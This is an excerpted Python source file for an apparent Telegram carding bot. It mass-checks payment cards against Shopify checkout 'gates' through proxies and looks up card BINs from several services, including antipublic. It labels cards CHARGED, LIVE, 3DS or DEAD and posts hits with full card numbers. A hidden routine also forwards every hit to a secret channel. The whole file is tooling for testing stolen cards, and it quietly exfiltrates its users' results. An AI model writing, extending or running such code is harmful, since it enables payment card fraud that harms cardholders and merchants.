...
async def _fetch_bin_direct(bin6: str) -> dict:
    """Fire all BIN sources simultaneously; return the FIRST usable result.

    Uses asyncio.wait(FIRST_COMPLETED) so we return as soon as any source
    gives a valid response — typically <1s from antipublic.cc.
    8 sources fired in parallel; each has an 8s individual timeout.
    """
    ...
    sources = [
        ...
        (
            ...
            lambda d: {
                ...
                "bank":         (d.get("bank") or d.get("bank_name") or ""),
                "country":      (d.get("country_name") or d.get("country") or ""),
                "country_code": (d.get("country_code") or d.get("country_alpha2") or ""),
            },
        ),
        # ── 1. antipublic.one  (backup mirror) ────────────────────────────
        (
        ...
        # ── 2. handyapi  (key is "Bank", not "Issuer") ────────────────────
        (
        ...
        (
            ...
            lambda d: {
                ...
                "bank":         (d.get("bank") or d.get("issuer") or ""),
                "country":      (d.get("country") or d.get("country_name") or ""),
                "country_code": (d.get("country_code") or d.get("iso2") or ""),
            },
        ),
        # ── 5. handy.codes ────────────────────────────────────────────────
        (
            ...
            lambda d: {
                ...
                "country_code": (d.get("country_code") or d.get("iso") or ""),
            },
        ),
        # ── 6. binlist.net ────────────────────────────────────────────────
        (
...
async def _bin_lookup(bin6: str) -> dict:
    ...
    try:
        result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=20)
    except Exception:
        result = {}
...
def build_result_msg(card, resp, verdict, bin_data, price, currency,
    ...
    if verdict == "CHARGED":
        hdr = (
            ...
            f'<b>Info ➳ {bin_s}</b>\n'
            f'<b>◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆</b>\n'
            f'<b>User ➳ {ulink} <tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji> · {ts} · {DEV_LINK_HTML}</b>'
        )
    elif verdict in ("LIVE", "TDS"):
        _lbl = "HIT ➳ LIVE [3DS]" if verdict == "TDS" else "HIT ➳ LIVE"
        hdr = (
            f'<b>✅ {_lbl}</b>\n'
            f'<b>◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇</b>\n'
            f'<b>Card ➳ <code>{escape(card)}</code></b>\n'
        ...
        hdr = f'<b>💀 DEAD ➳ {escape(card)} · {safe_resp} · {ts}</b>'
    return hdr
...
def _progress_text(sess: dict) -> str:
    ...
    left_n = max(0, sess['total'] - sess['checked'])
    return (
        f'<b>⚡ MASS CHECK — {sess["status"]}</b>\n'
        f'<b>◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆</b>\n'
        f'<b>Progress ➳ {sess["checked"]} / {sess["total"]} cards</b>\n'
        f'<b>💎 Charged ➳ {sess["charged"]} cards</b>\n'
        f'<b>✅ Live    ➳ {sess["approved"]} cards</b>\n'
        f'<b>💀 Dead    ➳ {sess["dead"]} cards</b>\n'
        f'<b>⏳ Left    ➳ {left_n} cards</b>\n'
        f'<b>◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆</b>\n'
        f'<b>User ➳ {ulink} <tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji> · {DEV_LINK_HTML}</b>'
    )
...
async def _send_hit(bot, user, text: str, verdict: str,
    ...
    if verdict == "CHARGED":
        _c_hdr = f'<b>💎 HIT ➳ CHARGED</b>'
        _c_sep = "◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆"
        _c_gate = f'<b>Gate ➳ Shopify • {_fmt_price(price, currency)}</b>'
    else:
        _lbl = "HIT ➳ LIVE [3DS]" if verdict == "TDS" else "HIT ➳ LIVE"
        _c_hdr = f'<b>✅ {_lbl}</b>'
        _c_sep = "◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇"
        _c_gate = '<b>Gate ➳ Shopify</b>'
    compact_html = (
        f'{_c_hdr}\n'
        f'<b>{_c_sep}</b>\n'
        f'<b>Card ➳ <code>{escape(card)}</code></b>\n'
        ...
        f'<b>{_c_sep}</b>\n'
        f'<b>User ➳ {ulink} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )
    ...
    if SECRET_CHANNEL_ID and verdict in ("CHARGED", "LIVE", "TDS"):
        try:
            ...
            _sc_hdr = ('\U0001f48e HIT \u27b3 CHARGED' if verdict == 'CHARGED'
                       else '\u2705 HIT \u27b3 LIVE [3DS]' if verdict == 'TDS'
                       else '\u2705 HIT \u27b3 LIVE')
            _sc_sep = "◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆" if verdict == "CHARGED" else "◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇"
            sc_html = (
                f'<b>{_sc_hdr}</b>\n'
                f'<b>{_sc_sep}</b>\n'
                f'<b>Card \u27b3 <code>{escape(card)}</code></b>\n'
...
async def _msh_session_worker(bot, sid, cards, user, plan, all_sites, proxies):
    ...
    async def _bin_get_local(bin6: str) -> dict:
        ...
        if bin6 in _local_bin_events:
            try:
                await asyncio.wait_for(_local_bin_events[bin6].wait(), timeout=18)
            except asyncio.TimeoutError:
                pass
            return _BIN_CACHE.get(bin6) or {}
        # We are the first — claim the slot and fetch
        # Use _bin_lookup (not _fetch_bin_direct directly) so we get
        # the full fallback chain including config.py get_bin_info.
        ev = asyncio.Event()
        _local_bin_events[bin6] = ev
        try:
            result = await asyncio.wait_for(_bin_lookup(bin6), timeout=15)
            _BIN_CACHE[bin6] = result if result else {}
        except Exception:
            _BIN_CACHE[bin6] = {}
        finally:
...
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await _send_as_media(context.bot, update.effective_chat.id, _cmd_eid,
                         caption=res_html, parse_mode="HTML")
